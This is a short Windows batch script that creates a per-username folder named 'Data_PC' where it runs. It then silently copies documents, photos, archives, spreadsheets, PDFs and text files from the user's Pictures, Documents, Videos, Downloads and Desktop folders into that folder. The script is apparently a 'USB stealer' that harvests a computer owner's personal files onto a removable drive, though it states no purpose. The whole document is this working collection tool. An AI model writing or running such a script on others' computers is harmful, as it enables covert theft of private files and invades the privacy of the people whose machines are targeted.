@echo off
color 02

IF NOT EXIST ".\Data_PC"%USERNAME% MD ".\Data_PC\"%USERNAME%

cd ".\Data_PC\"%USERNAME%

for /R %USERPROFILE%\Pictures\ %%x in (*.rar, *.jpg, *.xls, *.doc, *.pdf, *.zip, *.pptx, *.png, *.jpeg, *.txt, *.html) do copy "%%x" ".\"
for /R %USERPROFILE%\Documents\ %%x in (*.rar, *.jpg, *.xls, *.doc, *.pdf, *.zip, *.pptx, *.png, *.jpeg, *.txt, *.html) do copy "%%x" ".\"
for /R %USERPROFILE%\Videos\ %%x in (*.rar, *.jpg, *.xls, *.doc, *.pdf, *.zip, *.pptx, *.png, *.jpeg, *.txt, *.html) do copy "%%x" ".\"
for /R %USERPROFILE%\Downloads\ %%x in (*.rar, *.jpg, *.xls, *.doc, *.pdf, *.zip, *.pptx, *.png, *.jpeg, *.txt, *.html) do copy "%%x" ".\"
for /R %USERPROFILE%\Desktop\ %%x in (*.rar, *.jpg, *.xls, *.doc, *.pdf, *.zip, *.pptx, *.png, *.jpeg, *.txt, *.html) do copy "%%x" ".\"

EXIT